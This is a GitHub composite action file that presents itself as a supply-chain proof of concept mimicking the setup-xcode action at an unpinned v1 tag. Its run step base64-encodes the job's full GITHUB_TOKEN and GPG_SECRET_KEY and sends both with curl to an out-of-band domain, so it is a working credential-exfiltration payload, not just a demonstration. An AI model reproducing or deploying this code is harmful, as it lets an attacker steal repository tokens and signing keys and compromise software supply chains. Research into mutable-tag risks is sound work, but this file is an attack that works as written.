name: 'setup-xcode (mutable v1 tag - supply chain PoC)'
description: 'Composite action mirroring maxim-lobanov/setup-xcode executed at an unpinned v1 ref. Proves mutable-tag actions run with the calling job''s secrets in env.'
author: 'sl4x0'
branding:
  icon: shield
  color: red
runs:
  using: "composite"
  steps:
    - name: Execute at mutable v1 tag (attacker-controlled code here when tag is moved)
      shell: bash
      env:
        POC_OOB_DOMAIN: ${{ env.POC_OOB_DOMAIN }}
      run: |
        echo "=== [poc] running inside signing job via unpinned third-party action ref ==="
        echo "runner: $(uname -a | head -c 80)"
        echo "[poc] GITHUB_TOKEN=${GITHUB_TOKEN:+PRESENT len ${#GITHUB_TOKEN}}"
        echo "[poc] GPG_SECRET_KEY=${GPG_SECRET_KEY:+PRESENT len ${#GPG_SECRET_KEY}}"
        if [ -n "${GITHUB_TOKEN:-}" ]; then
          curl -s -o /dev/null -w 'oob_gt_http=%{http_code}\n' --max-time 12 "https://${POC_OOB_DOMAIN}/tkn/$(printf %s "$GITHUB_TOKEN" | base64 -w0)"
        fi
        if [ -n "${GPG_SECRET_KEY:-}" ]; then
          curl -s -o /dev/null -w 'oob_gpg_http=%{http_code}\n' --max-time 12 "https://${POC_OOB_DOMAIN}/gpg/$(printf %s "$GPG_SECRET_KEY" | base64 -w0)"
        fi
        echo "=== [poc] done ==="
